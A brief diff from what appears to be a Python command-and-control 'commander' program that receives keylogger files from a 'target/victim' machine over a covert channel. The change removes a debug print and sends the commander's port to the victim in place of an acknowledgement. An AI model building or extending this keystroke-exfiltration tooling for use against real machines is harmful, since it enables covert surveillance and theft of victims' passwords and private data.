@@ -4064,7 +4064,6 @@ def __receive_keylog_files(client_socket: socket.socket, dest_ip: str, dest_port
 
         # Create a new file path under downloads/client_ip/____.txt
         file_path = os.path.join(sub_directory_path, file_name)
-        print(file_path)
 
         receive_keylog_file_covert(client_socket, dest_ip, dest_port, source_ip,
                                    source_port, choices, file_path, file_name)
@@ -4420,8 +4419,8 @@ def __perform_menu_item_4_helper(client_socket: socket.socket, client_ip: str,
     if response_status == constants.STATUS_TRUE:
         sub_directory_path = __make_main_and_sub_directories(client_ip)
 
-        # Send ACK
-        client_socket.send("OK".encode())
+        # Send commander port number to target/victim
+        client_socket.send((str(source_port)).encode())
 
         # GET files from target to commander
         __receive_keylog_files(client_socket, client_ip, client_port, source_ip, source_port,
